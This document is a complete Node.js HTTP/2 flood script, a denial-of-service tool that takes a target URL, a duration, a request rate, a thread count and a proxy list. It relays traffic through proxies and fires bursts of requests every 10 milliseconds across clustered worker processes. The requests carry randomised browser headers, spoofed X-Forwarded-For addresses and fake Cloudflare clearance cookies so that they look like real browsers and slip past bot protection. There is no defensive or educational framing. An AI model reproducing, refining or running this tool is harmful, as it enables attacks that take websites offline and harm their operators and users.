const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});

if (process.argv.length < 7) {
    console.log("Usage: node script.js <target> <time> <rate> <threads> <proxy_file>");
    process.exit(1);
}

function readLines(filePath) {
    if (!fs.existsSync(filePath)) process.exit(1);
    const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
    if (!lines.length) process.exit(1);
    return lines;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(arr) {
    return arr[randomIntn(0, arr.length)];
}

function randstr(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let res = "";
    for (let i = 0; i < length; i++) {
        res += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return res;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 15; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0"
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "application/json, text/plain, */*",
    "image/jpeg, image/png, */*"
];

const langHeaders = [
    "en-US,en;q=0.9",
    "vi-VN,vi;q=0.9,en-US;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8"
];

const encodingHeaders = ["gzip, deflate, br, zstd"];

const secFetchDest = ["document", "script", "image", "font"];
const secFetchMode = ["navigate", "cors", "no-cors", "same-origin"];
const secFetchSite = ["same-origin", "same-site", "cross-site"];

const cacheControl = ["no-cache", "max-age=0"];

const referers = [
    `https://${parsedTarget.host}/`,
    `https://${parsedTarget.host}${parsedTarget.path}`,
    `https://${parsedTarget.host}/search?q=${randstr(6)}`,
    "https://www.google.com/",
    "https://www.bing.com/",
    ""
];

const platforms = ["Windows", "Macintosh", "Linux", "iPhone", "Android"];

const secChUa = [
    '"Google Chrome";v="129", "Chromium";v="129", "Not.A/Brand";v="99"',
    '"Firefox";v="131"',
    '"Safari";v="18.1"',
    '"Microsoft Edge";v="129"'
];

const secChUaFullVersion = [
    '"129.0.6668.100"',
    '"131.0.0.0"',
    '"18.1.0"',
    '"129.0.2792.79"'
];

const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256"
].join(":");

class NetSocket {
    HTTP(options) {
        return new Promise((resolve, reject) => {
            const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
            const buffer = Buffer.from(payload);
            const connection = net.connect({
                host: options.host,
                port: options.port,
                noDelay: true
            });
            connection.setTimeout(options.timeout * 1000);
            connection.setKeepAlive(true, 60000);
            connection.on("connect", () => connection.write(buffer));
            connection.on("data", chunk => {
                const response = chunk.toString("utf-8");
                if (!response.includes("HTTP/1.1 200")) {
                    connection.destroy();
                    return reject("invalid proxy response");
                }
                resolve(connection);
            });
            connection.on("timeout", () => {
                connection.destroy();
                reject("timeout");
            });
            connection.on("error", () => {
                connection.destroy();
                reject("error");
            });
        });
    }
}

const Socker = new NetSocket();

function generateDynamicPath() {
    const basePath = parsedTarget.path === "/" ? "" : parsedTarget.path;
    const queries = [
        `q=${encodeURIComponent(randstr(6))}`,
        `id=${randomIntn(1000, 9999)}`,
        `page=${randomIntn(1, 20)}`,
        `token=${randstr(10)}`,
        `lang=${randomElement(['en', 'vi', 'zh', 'fr'])}`,
        `category=${randstr(5)}`
    ];
    const queryCount = randomIntn(1, 4);
    return `${basePath}?${queries.slice(0, queryCount).join('&')}`;
}

function generateHeaders() {
    const uaIndex = randomIntn(0, userAgents.length);
    return {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":path": generateDynamicPath(),
        ":scheme": "https",
        "user-agent": userAgents[uaIndex],
        "accept": randomElement(acceptHeaders),
        "accept-language": randomElement(langHeaders),
        "accept-encoding": randomElement(encodingHeaders),
        "sec-fetch-dest": randomElement(secFetchDest),
        "sec-fetch-mode": randomElement(secFetchMode),
        "sec-fetch-site": randomElement(secFetchSite),
        "sec-ch-ua": secChUa[uaIndex],
        "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
        "sec-ch-ua-platform": platforms[uaIndex % platforms.length],
        "sec-ch-ua-full-version-list": secChUaFullVersion[uaIndex],
        "upgrade-insecure-requests": "1",
        "priority": randomElement(["u=0, i", "u=1"]),
        "cache-control": randomElement(cacheControl),
        "referer": randomElement(referers),
        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`,
        "sec-ch-prefers-color-scheme": randomElement(["light", "dark"]),
        "sec-ch-viewport-width": randomIntn(800, 1920).toString(),
        "cookie": `__cfduid=${randstr(32)}; cf_clearance=${randstr(40)}; session=${randstr(16)}`
    };
}

async function runFlooder() {
    let proxyAddr = randomElement(proxies);
    let parsedProxy = proxyAddr.split(":");
    try {
        const connection = await Socker.HTTP({
            host: parsedProxy[0],
            port: parseInt(parsedProxy[1]),
            address: parsedTarget.host + ":443",
            timeout: 5
        });
        const tlsOptions = {
            ALPNProtocols: ['h2'],
            ciphers: ciphers,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            minVersion: 'TLSv1.3',
            maxVersion: 'TLSv1.3',
            ecdhCurve: 'X25519',
            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256',
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION,
            socket: connection
        };
        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 120000);
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                maxConcurrentStreams: 1000,
                initialWindowSize: 10 * 1024 * 1024,
                maxHeaderListSize: 262144
            },
            createConnection: () => tlsConn
        });
        client.on("connect", () => {
            const attackInterval = setInterval(() => {
                const headers = generateHeaders();
                for (let i = 0; i < args.rate; i++) {
                    const req = client.request(headers, { endStream: true });
                    req.on("response", () => req.close());
                    req.on("error", () => req.close());
                    req.end();
                }
            }, 10);
            setTimeout(() => {
                clearInterval(attackInterval);
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
            }, args.time * 1000);
        });
        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });
        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });
    } catch {
        setTimeout(runFlooder, 500);
    }
}

if (cluster.isMaster) {
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    setInterval(runFlooder, 0);
}
